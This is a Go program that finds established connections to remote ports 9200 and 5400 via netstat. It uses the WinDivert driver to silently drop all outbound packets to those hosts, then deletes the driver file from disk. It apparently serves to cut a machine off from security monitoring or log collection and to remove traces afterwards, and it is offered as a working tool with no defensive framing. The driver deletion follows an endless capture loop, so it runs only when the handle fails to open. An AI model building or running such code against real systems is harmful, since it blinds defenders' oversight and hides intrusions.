package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/Asutorufa/windivert"
)

var (
	targetPorts = map[string]bool{
		"9200": true,
		"5400": true,
	}
	driverName = "WinDivert64.sys" // or WinDivert32.sys depending on system
)

func main() {
	ips := findTargetIPs()
	if len(ips) == 0 {
		fmt.Println("[-] No active connections to target ports found.")
		return
	}

	fmt.Printf("[*] Target IPs: %v\n", ips)

	err := startPacketDrop(ips)
	if err != nil {
		fmt.Printf("[-] Error starting packet drop: %v\n", err)
	}

	err = selfRemoveDriver()
	if err != nil {
		fmt.Printf("[-] Failed to remove driver: %v\n", err)
	} else {
		fmt.Println("[+] Driver removed from disk.")
	}
}

func findTargetIPs() []string {
	cmd := exec.Command("netstat", "-ano")
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("[-] Failed to run netstat: %v\n", err)
		return nil
	}

	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	re := regexp.MustCompile(`^\s*TCP\s+\S+:(\d+)\s+([\d\.]+):(\d+)\s+ESTABLISHED\s+\d+`)

	uniqueIPs := make(map[string]bool)
	for scanner.Scan() {
		line := scanner.Text()
		matches := re.FindStringSubmatch(line)
		if len(matches) == 4 {
			remoteIP := matches[2]
			port := matches[3]
			if targetPorts[port] {
				uniqueIPs[remoteIP] = true
			}
		}
	}

	ips := []string{}
	for ip := range uniqueIPs {
		ips = append(ips, ip)
	}
	return ips
}

func startPacketDrop(ipList []string) error {
	filter := "outbound and ("
	for i, ip := range ipList {
		if i > 0 {
			filter += " or "
		}
		filter += fmt.Sprintf("ip.DstAddr == %s", ip)
	}
	filter += ")"

	fmt.Printf("[*] Applying filter: %s\n", filter)

	handle, err := windivert.Open(filter, windivert.LayerNetwork, 0, 0)
	if err != nil {
		return fmt.Errorf("failed to open WinDivert handle: %w", err)
	}
	defer handle.Close()

	packet := make([]byte, 1500)
	addr := new(windivert.Address)

	fmt.Println("[*] Packet dropper running. Press Ctrl+C to exit.")
	for {
		_, err := handle.Recv(packet, addr)
		if err != nil {
			continue
		}
		fmt.Printf("[DROP] %s\n", addr.IPv4Destination())
		// Don't reinject = silently drop
	}
}

func selfRemoveDriver() error {
	exeDir, err := os.Executable()
	if err != nil {
		return err
	}
	dir := filepath.Dir(exeDir)
	driverPath := filepath.Join(dir, driverName)

	// Delay to ensure the driver is released
	time.Sleep(2 * time.Second)

	err = os.Remove(driverPath)
	if err != nil {
		return fmt.Errorf("could not delete %s: %w", driverPath, err)
	}
	return nil
}
